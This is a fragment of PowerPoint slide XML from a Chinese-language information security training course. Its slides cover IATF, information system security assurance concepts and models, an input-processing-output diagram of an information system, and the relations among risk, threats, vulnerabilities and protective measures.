              <a:t>IATF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>强调从技术、管理和人等多个角度来保障信息系统的安全</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3588564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8" grpId="0"/>
      <p:bldP spid="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829543"/>
            <a:ext cx="7704459" cy="432346"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>知识域：信息系统安全保障概念与模型</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="579317" y="3501008"/>
            <a:ext cx="8191500" cy="2448272"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>知识子域：信息系统安全保障模型</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" kern="1200" dirty="0">
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>理解信息系统安全保障模型中生命周期、保障要素和安全特征的含义和内容</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" kern="1200" dirty="0">
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>理解风险和策略是信息系统安全保障的核心问题 </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" kern="1200" dirty="0">
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>理解业务使命实现是信息安全保障的根本目的</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" kern="1200" dirty="0">
              <a:cs typeface="+mn-cs"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="矩形 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="579317" y="1475656"/>
            <a:ext cx="8401091" cy="1778949"/>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zh-CN" sz="2800" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>知识子域：信息系统安全保障</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750" eaLnBrk="0" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF9900"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>了解信息系统的概念及其包含的基本资源</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750" eaLnBrk="0" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF9900"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>理解信息系统安全保障的概念，以及风险、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>业务</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>使命等信息系统安全保障相关概念及其之间的关系</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="36088824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22512" y="3667319"/>
            <a:ext cx="1440160" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln/>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zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>输入</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="文本框 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3923928" y="3482652"/>
            <a:ext cx="1440160" cy="830997"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln/>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zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>数据</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:latin typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>处理</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="文本框 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6304912" y="3667316"/>
            <a:ext cx="1440160" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln/>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zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>输出</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="文本框 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3923928" y="1983964"/>
            <a:ext cx="1440160" cy="830997"/>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sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>系统</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:latin typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>控制</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="文本框 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3923928" y="5013176"/>
            <a:ext cx="1440160" cy="830997"/>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sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>数据</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:latin typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>存储</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="12" name="直接箭头连接符 11"/>
          <p:cNvCxnSpPr>
            <a:endCxn id="7" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2962672" y="3898149"/>
            <a:ext cx="961256" cy="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7" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="5364088" y="3898149"/>
            <a:ext cx="961256" cy="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9" idx="2"/>
            <a:endCxn id="7" idx="0"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4644008" y="2814961"/>
            <a:ext cx="0" cy="667691"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="57150">
            <a:solidFill>
              <a:srgbClr val="7030A0"/>
            </a:solidFill>
            <a:headEnd type="triangl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4644008" y="4313649"/>
            <a:ext cx="0" cy="667691"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="57150">
            <a:solidFill>
              <a:srgbClr val="7030A0"/>
            </a:solidFill>
            <a:headEnd type="triangl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标题 3"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="667172" y="909285"/>
            <a:ext cx="6513512"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r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="黑体" pitchFamily="49" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>信息系统流程概要</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="25555687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par>
                                <p:cTn id="32" presetID="47"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1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="17"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="35" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="17"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="3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24318" y="1628800"/>
            <a:ext cx="4716016" cy="3896458"/>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6592" y="1628800"/>
            <a:ext cx="4234456" cy="3896458"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="矩形 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="362230" y="805012"/>
            <a:ext cx="3068469" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>信息系统：示例</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="矩形 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1259632" y="5564216"/>
            <a:ext cx="1733167" cy="400110"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>智能家居系统</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="矩形 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6037236" y="5564216"/>
            <a:ext cx="2252540" cy="400110"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>企业信息管理系统</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="5152738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980728"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>信息系统安全保障</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="533400" y="1844824"/>
            <a:ext cx="8191500" cy="4555976"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>信息系统安全保障是在信息系统的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>整个生命周期</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>中，从</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>技术、管理、工程和人员</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>等方面提出安全保障要求，确保信息系统的保密性、完整性和可用性，降低安全风险到可接受的程度，从而保障系统实现</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>组织机构的使命</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2233238004"/>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Oval 13"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1265195" y="5629809"/>
            <a:ext cx="1040058" cy="607503"/>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50" name="Text Box 22"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="665162" y="5708141"/>
            <a:ext cx="17789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en-US" altLang="zh-CN" sz="2000" b="1">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>措施</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31751" name="Oval 3"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3820631" y="2419971"/>
            <a:ext cx="2070704" cy="644057"/>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a:solidFill>
                <a:schemeClr val="tx2"/>
              </a:solidFill>
              <a:latin typeface="宋体" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31752" name="Text Box 4"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4124178" y="2531677"/>
            <a:ext cx="14447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sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>信息系统</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31753" name="Oval 5"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2502911" y="3561866"/>
            <a:ext cx="1569500" cy="783312"/>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pPr algn="ctr"/>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1600">
              <a:solidFill>
                <a:schemeClr val="tx2"/>
              </a:solidFill>
              <a:latin typeface="宋体" pitchFamily="2" charset="-122"/>
              <a:cs typeface="Arial" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31754" name="Oval 6"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5578377" y="3724529"/>
            <a:ext cx="1513025" cy="640575"/>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55" name="Text Box 7"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2764102" y="3962225"/>
            <a:ext cx="8282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endParaRPr lang="zh-CN" altLang="zh-CN" sz="2400" b="1">
              <a:solidFill>
                <a:schemeClr val="tx2"/>
              </a:solidFill>
              <a:latin typeface="+mn-ea"/>
              <a:ea typeface="+mn-ea"/>
              <a:cs typeface="Arial" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31756" name="Text Box 8"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2874696" y="3692418"/>
            <a:ext cx="8329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sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>保障</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31757" name="Text Box 9"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5954868" y="3794156"/>
            <a:ext cx="8894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b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>风险</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31758" name="Oval 13"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5208944" y="4907422"/>
            <a:ext cx="1160065" cy="671908"/>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59" name="Text Box 14"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5201885" y="5058862"/>
            <a:ext cx="10659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b="1">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>脆弱性</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31760" name="Oval 16"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7124345" y="4895237"/>
            <a:ext cx="1040058" cy="642316"/>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61" name="Text Box 17"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7178466" y="5072788"/>
            <a:ext cx="10659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b="1">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>威胁</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31762" name="Oval 27"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4133591" y="1420813"/>
            <a:ext cx="1381253" cy="642316"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:gradFill rotWithShape="1">
            <a:gsLst>
              <a:gs pos="0">
                <a:srgbClr val="3399FF"/>
              </a:gs>
              <a:gs pos="100000">
                <a:srgbClr val="FFFFFF"/>
              </a:gs>
            </a:gsLst>
            <a:lin ang="5400000" scaled="1"/>
          </a:gradFill>
          <a:ln w="12700" cap="sq">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
